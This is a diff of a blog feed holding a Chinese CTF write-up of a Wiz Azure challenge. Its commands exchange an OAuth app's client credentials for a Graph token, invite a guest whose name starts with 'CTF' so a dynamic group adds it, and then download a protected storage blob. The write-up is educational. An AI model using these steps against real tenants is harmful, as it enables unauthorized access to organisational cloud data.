@@ -1428,7 +1428,7 @@ Links       :
 &lt;blockquote&gt;
 &lt;p&gt;you&apos;ve created a malicious OAuth app in your tenant&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;自己的租户里已经有一个恶意 App&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;租户里已经有一个恶意 App&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Client ID&lt;/li&gt;
 &lt;li&gt;Client Secret&lt;/li&gt;
@@ -1438,7 +1438,7 @@ Links       :
 &lt;blockquote&gt;
 &lt;p&gt;seek to deploy it into the victim&apos;s tenant&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;目标：让受害租户“信任 / 安装 / 授权”你的 OAuth App&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;目的是让受害租户“信任 / 安装 / 授权”你的 OAuth App&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;根据题目说的看下环境变量&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;env | grep AZURE
 $WEB_APP_ENDPOINT
@@ -1476,7 +1476,7 @@ $WEB_APP_ENDPOINT
 d26f353d-c564-48e7-b26f-aa48c6eecd58
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/05.png&quot; alt=&quot;image-20251217001022983&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;继续构造&lt;/p&gt;
+&lt;p&gt;构造命令将临时凭证兑换成&lt;strong&gt;access_token&lt;/strong&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;curl -X POST https://login.microsoftonline.com/d26f353d-c564-48e7-b26f-aa48c6eecd58/oauth2/v2.0/token -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;client_id=$AZURE_CLIENT_ID&quot; -d &quot;client_secret=$AZURE_CLIENT_SECRET&quot; -d &quot;grant_type=client_credentials&quot; -d &quot;scope=https://graph.microsoft.com/.default&quot;
 
 &lt;/code&gt;&lt;/pre&gt;
@@ -1491,23 +1491,23 @@ d26f353d-c564-48e7-b26f-aa48c6eecd58
     &quot;User.Invite.All&quot;
   ],
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;尝试列出所有组，发现&lt;/p&gt;
+&lt;p&gt;尝试读一下所有组，发现：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;curl -s \
   -H &quot;Authorization: Bearer $TOKEN&quot; \
   https://graph.microsoft.com/v1.0/groups | jq
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/08.png&quot; alt=&quot;image-20251218163557680&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;盐都不带盐的了，名字直接把flag拍脸上了。动态组说明 &lt;strong&gt;flag 不是静态写死的&lt;/strong&gt;，而是通过某个条件“被赋予”。成员组规则解释了这个条件，即：只要满足以下任意一个条件，就会被自动加入这个“flag 访问组”&lt;/p&gt;
+&lt;p&gt;盐都不带盐的，名字直接把flag拍脸上了。动态组说明 &lt;strong&gt;flag 不是静态写死的&lt;/strong&gt;，而是通过某个条件“被赋予”。成员组规则解释了这个条件，即：只要满足以下任意一个条件，就会被自动加入这个“flag 访问组”；&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;内部员工：Finance + Manager&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;访客用户（Guest），且 displayName 以 &lt;code&gt;CTF&lt;/code&gt; 开头&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;city = Seattle&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;结合现在拥有的权限（邀请Guest用户），我们使用第二个条件应该就可以拿到访问权限，即：用&quot;Group.Read.All&quot;的权限，邀请一个Guest，且他的displayName为&quot;ctfxxxxxxx&quot;，这样他就会被动态组自动拉到&quot;Users assigned access to flag&quot;组中。&lt;/p&gt;
+&lt;p&gt;结合现在拥有的权限（邀请Guest用户），我们使用第二个条件应该就可以拿到访问权限，即：用&quot;Group.Read.All&quot;的权限，邀请一个Guest，且他的displayName为&quot;ctfxxxx&quot;，这样他就会被动态组自动拉到&quot;Users assigned access to flag&quot;组中。&lt;/p&gt;
 &lt;p&gt;那么注册一个前缀为ctf的邮箱吧先。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/09.png&quot; alt=&quot;image-20251218182219709&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;然后构造请求&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;curl -X POST   -H &quot;Authorization: Bearer $TOKEN&quot;   -H &quot;Content-Type: application/json&quot;   https://graph.microsoft.com/v1.0/invitations   -d &apos;{
+&lt;pre&gt;&lt;code&gt;curl -X POST -H &quot;Authorization: Bearer $TOKEN&quot; -H &quot;Content-Type: application/json&quot;   https://graph.microsoft.com/v1.0/invitations -d &apos;{
     &quot;invitedUserEmailAddress&quot;: &quot;ctfsususu@proton.me&quot;,
     &quot;invitedUserDisplayName&quot;: &quot;CTF-Flag-Access&quot;,
     &quot;inviteRedirectUrl&quot;: &quot;https://portal.azure.com&quot;,                                         
@@ -1517,33 +1517,34 @@ d26f353d-c564-48e7-b26f-aa48c6eecd58
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/10.png&quot; alt=&quot;image-20251218182548404&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;jq一下方便阅读&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/11.png&quot; alt=&quot;image-20251218182816395&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;给了一个兑换邀请的链接，直接check&lt;/p&gt;
+&lt;p&gt;给了一个兑换邀请的链接，直接check，然后跟着步骤往后操作。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/12.png&quot; alt=&quot;image-20251218182915014&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/13.png&quot; alt=&quot;image-20251218182955285&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/14.png&quot; alt=&quot;image-20251218183014187&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;选择组织登录&lt;/p&gt;
+&lt;p&gt;选择组织登录，域名为前面给咱们“管理员”账号的内个。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/15.png&quot; alt=&quot;image-20251218183818740&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/16.png&quot; alt=&quot;image-20251218183848433&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/17.png&quot; alt=&quot;image-20251218183909298&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;完成后就到控制台了&lt;/p&gt;
+&lt;p&gt;安装Authenticator并验证完成后就到控制台了。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/18.png&quot; alt=&quot;image-20251218184254721&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;访问https://microsoft.com/devicelogin&lt;/p&gt;
+&lt;p&gt;访问https://microsoft.com/devicelogin以在CLI中完成Device Code Flow；&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/19.png&quot; alt=&quot;image-20251218184431219&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;在题目环境的命令行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;az login --tenant  --use-device-code
+&lt;p&gt;在题目环境的CLI里跑这个命令：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;az login --tenant [受害租户id] --use-device-code
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/20.png&quot; alt=&quot;image-20251218185021457&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;输入代码后跟着流程继续操作就行。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/21.png&quot; alt=&quot;image-20251218185051324&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/22.png&quot; alt=&quot;image-20251218185104516&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/23.png&quot; alt=&quot;image-20251218185120622&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/24.png&quot; alt=&quot;image-20251218185803360&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;访问https://myapps.microsoft.com/?tenantid=d26f353d-c564-48e7-b26f-aa48c6eecd58&lt;/p&gt;
+&lt;p&gt;登录成功，访问https://myapps.microsoft.com/?tenantid=d26f353d-c564-48e7-b26f-aa48c6eecd58看看分配的app&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/25.png&quot; alt=&quot;image-20251218185341274&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;直接访问发现没有权限，且被重定向到&lt;/p&gt;
+&lt;p&gt;直接访问发现没有权限，且被重定向：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;https://azurechallengectfflag.blob.core.windows.net/grab-the-flag/ctf_flag.txt
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/26.png&quot; alt=&quot;image-20251218190042234&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;构造 下载下来&lt;/p&gt;
+&lt;p&gt;这说明“CTF Challenge Flag” 这个企业应用，本质上只是一个入口，它真正保护的资源是 Azure Blob Storage 里的一个文件。在 Azure 里这是非常常见的设计，Entra ID（AAD）负责身份 &amp;amp; 授权，Blob Storage负责存储真实数据，企业app把“谁能访问哪个存储”连起来。由于我们是匿名访问，所以无法访问，那我们就在CLI使用当前 az 登录的身份，自动向 Azure AD 请求 token，把 token 带给 Blob Storage。&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;az storage blob download --account-name azurechallengectfflag --container-name grab-the-flag --name ctf_flag.txt --file &quot;ctf_flag.txt&quot; --auth-mode login
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/27.png&quot; alt=&quot;image-20251218185848665&quot; /&gt;&lt;/p&gt;
@@ -1552,6 +1553,16 @@ d26f353d-c564-48e7-b26f-aa48c6eecd58
 &lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/29.png&quot; alt=&quot;image-20251218190137915&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;WIZ_CTF{EntraID_Sensitive_Privileges_Breaking_Barriers}
 &lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;核心考点&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;OAuth App 滥用（App-only 权限）&lt;/li&gt;
+&lt;li&gt;Guest Invite 攻击面&lt;/li&gt;
+&lt;li&gt;Azure Dynamic Group 规则设计缺陷&lt;/li&gt;
+&lt;li&gt;displayName 自动派生行为&lt;/li&gt;
+&lt;li&gt;Group → RBAC → Storage 权限继承&lt;/li&gt;
+&lt;li&gt;Azure AD Authentication for Blob Storage&lt;/li&gt;
+&lt;li&gt;App 配置不可读 ≠ 资源不可用&lt;/li&gt;
+&lt;/ul&gt;
 </content:encoded></item><item><title>Draft Example</title><link>https://25pm-sumio.github.io/posts/draft/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/draft/</guid><pubDate>Fri, 01 Jul 2022 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;This Article is a Draft&lt;/h1&gt;
 &lt;p&gt;This article is currently in a draft state and is not published. Therefore, it will not be visible to the general audience. The content is still a work in progress and may require further editing and review.&lt;/p&gt;
 &lt;p&gt;When the article is ready for publication, you can update the &quot;draft&quot; field to &quot;false&quot; in the Frontmatter:&lt;/p&gt;
